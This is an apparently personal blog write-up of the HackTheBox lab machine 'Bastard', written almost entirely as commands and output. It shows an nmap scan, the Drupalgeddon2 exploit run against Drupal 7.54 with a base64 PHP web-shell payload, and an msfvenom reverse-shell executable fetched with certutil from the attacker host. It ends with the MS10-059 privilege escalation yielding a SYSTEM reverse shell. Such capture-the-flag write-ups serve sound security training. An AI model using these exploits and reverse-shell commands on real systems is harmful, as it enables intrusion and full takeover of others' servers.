<!DOCTYPE html>
<html>
        <head>
        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
        <meta charset="utf-8">
        <title>HackTheBox-bastard | 老白</title>
        <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
        <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
        <script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
         <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
         <script >hljs.initHighlightingOnLoad();</script>

    </head>
    <body>
              <header class="header mdui-m-b-5">      
            <div class="container  ">
                <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://V-alkoinen.github.io">老白</a></div>
                <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s"></div>
           
            <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
                   
                            <li><a href="/">首页</a>
                                <span class="nav-style top"></span>
                                <span class="nav-style bottom"></span>
                                <span class="nav-style left"></span>
                                <span class="nav-style right"></span>
                                </li>
                    
                            <li><a href="/archives">归档</a>
                                <span class="nav-style top"></span>
                                <span class="nav-style bottom"></span>
                                <span class="nav-style left"></span>
                                <span class="nav-style right"></span>
                                </li>
                    
                            <li><a href="/tags">标签</a>
                                <span class="nav-style top"></span>
                                <span class="nav-style bottom"></span>
                                <span class="nav-style left"></span>
                                <span class="nav-style right"></span>
                                </li>
                    
                  </nav>
                </div>
        </header>
        <div class="mdui-container ">
                <div class="mdui-row">
                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
                                    <div class="post-title  mdui-m-b-1">HackTheBox-bastard</div>
                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2022-04-26 21:32:09">2022-04-26 / 11 min read</div>
                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><p>nmap -A -T4  10.129.128.194</p>
<pre><code>Starting Nmap 7.70 ( https://nmap.org ) at 2022-04-26 18:55 CST
Nmap scan report for 10.129.128.194
Host is up (0.0033s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista (91%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 Professional or Windows 8 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   2.95 ms 10.10.14.1
2   3.23 ms 10.129.128.194

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.81 seconds

</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1650980049605.png" alt="" loading="lazy"><br>
curl https://raw.githubusercontent.com/dreadlocked/Drupalgeddon2/master/drupalgeddon2.rb -o exp4.rb</p>
<p>chmod +x exp4.rb</p>
<p>./exp4.rb  'http://10.129.128.194/' -v '7'</p>
<pre><code>[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.129.128.194/
--------------------------------------------------------------------------------
[+] Found  : http://10.129.128.194/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo GJCTTNMC
[+] Result : GJCTTNMC
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.129.128.194/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.129.128.194/sites/default/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.129.128.194/sites/default/files/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/files/)
[*] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
[!] FAILED : Couldn't find a writeable web path
--------------------------------------------------------------------------------
[*] Dropping back to direct OS commands
drupalgeddon2&gt;&gt; whoami
nt authority\iusr
drupalgeddon2&gt;&gt; net user 

drupalgeddon2&gt;&gt; dir
Volume in drive C has no label.
 Volume Serial Number is C4CD-C60B

 Directory of C:\inetpub\drupal-7.54

26/04/2022  02:14 ££    &lt;DIR&gt;          .
26/04/2022  02:14 ££    &lt;DIR&gt;          ..
19/03/2017  01:42 ££               317 .editorconfig
19/03/2017  01:42 ££               174 .gitignore
19/03/2017  01:42 ££             5.969 .htaccess
19/03/2017  01:42 ££             6.604 authorize.php
19/03/2017  01:42 ££           110.781 CHANGELOG.txt
19/03/2017  01:42 ££             1.481 COPYRIGHT.txt
19/03/2017  01:42 ££               720 cron.php
19/03/2017  01:43 ££    &lt;DIR&gt;          includes
19/03/2017  01:42 ££               529 index.php
19/03/2017  01:42 ££             1.717 INSTALL.mysql.txt
19/03/2017  01:42 ££             1.874 INSTALL.pgsql.txt
19/03/2017  01:42 ££               703 install.php
19/03/2017  01:42 ££             1.298 INSTALL.sqlite.txt
19/03/2017  01:42 ££            17.995 INSTALL.txt
19/03/2017  01:42 ££            18.092 LICENSE.txt
19/03/2017  01:42 ££             8.710 MAINTAINERS.txt
19/03/2017  01:43 ££    &lt;DIR&gt;          misc
19/03/2017  01:43 ££    &lt;DIR&gt;          modules
26/04/2022  02:14 ££           784.384 MS10-059.exe
26/04/2022  02:04 ££            43.696 nc64.exe
19/03/2017  01:43 ££    &lt;DIR&gt;          profiles
19/03/2017  01:42 ££             5.382 README.txt
19/03/2017  01:42 ££             2.189 robots.txt
19/03/2017  01:43 ££    &lt;DIR&gt;          scripts
26/04/2022  02:10 ££             7.168 shell.exe
19/03/2017  01:43 ££    &lt;DIR&gt;          sites
19/03/2017  01:43 ££    &lt;DIR&gt;          themes
19/03/2017  01:42 ££            19.986 update.php
19/03/2017  01:42 ££            10.123 UPGRADE.txt
19/03/2017  01:42 ££             2.200 web.config
19/03/2017  01:42 ££               417 xmlrpc.php
              24 File(s)      1.052.509 bytes
               9 Dir(s)   4.135.747.584 bytes free
               
drupalgeddon2&gt;&gt; systeminfo
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 ££
System Boot Time:          26/4/2022, 1:21:12 ££
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.548 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.542 MB
Virtual Memory: In Use:    553 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.128.194


</code></pre>
<p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=9999 -f exe &gt; ./shell.exe</p>
<p>python3 -m http.server 9998</p>
<p>certutil.exe -urlcache -split -f http://10.10.14.6:9998/shell.exe shell1.exe</p>
<p>certutil.exe -urlcache -split -f http://10.10.14.6:9998/winPEASx64.exe winPEASx64.exe</p>
<pre><code>drupalgeddon2&gt;&gt; certutil.exe -urlcache -split -f http://10.10.14.6:9998/shell.exe shell1.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.

drupalgeddon2&gt;&gt; shell1.exe

</code></pre>
<p>wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py</p>
<p>python2 windows-exploit-suggester.py --update</p>
<p>python2 windows-exploit-suggester.py --database 2022-04-26-mssb.xls --systeminfo 1.txt</p>
<pre><code>[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

</code></pre>
<p>git clone https://github.com/k4u5h41/MS10-059</p>
<p>python3 -m http.server 9998</p>
<p>certutil.exe -urlcache -split -f http://10.10.14.6:9998/MS10-059.exe MS10-059.exe</p>
<p>nc -nvlp 10000</p>
<p>MS10-059.exe 10.10.14.6 10000</p>
<pre><code>C:\inetpub\drupal-7.54&gt;MS10-059.exe 10.10.14.6 10000  
MS10-059.exe 10.10.14.6 10000
/Chimichurri/--&gt;This exploit gives you a Local System shell &lt;BR&gt;/Chimichurri/--&gt;Changing registry values...&lt;BR&gt;/Chimichurri/--&gt;Got SYSTEM token...&lt;BR&gt;/Chimichurri/--&gt;Running reverse shell...&lt;BR&gt;/Chimichurri/--&gt;Restoring default registry values...&lt;BR&gt;
</code></pre>
<pre><code>nc -nvlp 10000                 
listening on [any] 10000 ...
connect to [10.10.14.6] from (UNKNOWN) [10.129.128.194] 50613
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54&gt;whoami
whoami
nt authority\system
</code></pre>
</div>
                                    <div class="mdui-divider mdui-m-b-2"></div>
                                    <div class="mdui-row-xs-2 post-fenye">
                                       
                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/hackthebox-granny/">HackTheBox-granny</a></div></div>
                                        

                                        
                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/hackthebox-blue/">HackTheBox-blue</a></div> </div>
                                       
                                      </div>
                                   
                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
                                    
                                     <script src="https://V-alkoinen.github.io/media/scripts/Valine.min.js"></script>
 <div class="comment"></div>

<script>
      new Valine({
            el: '.comment',



            path: window.location.pathname,
            pageSize: 30,
            avatar:'mm', 
       })
    </script> 
<script>
    if(window.location.hash){
        var checkExist = setInterval(function() {
           if ($(window.location.hash).length) {
              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
              clearInterval(checkExist);
           }
        }, 100);
    }
</script>
                                </article>

                                    
                        </div>
                      </div>
    
                

              </div>
                    <footer class="footer mdui-m-t-5 mdui-text-center">
               <nav class="social-links">
                      <ul>
                      
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      
                           
                      </ul>
                    </nav>
                    <div class="copyright">
                      
                  </div>
                  
              </footer>
    </body>
</html>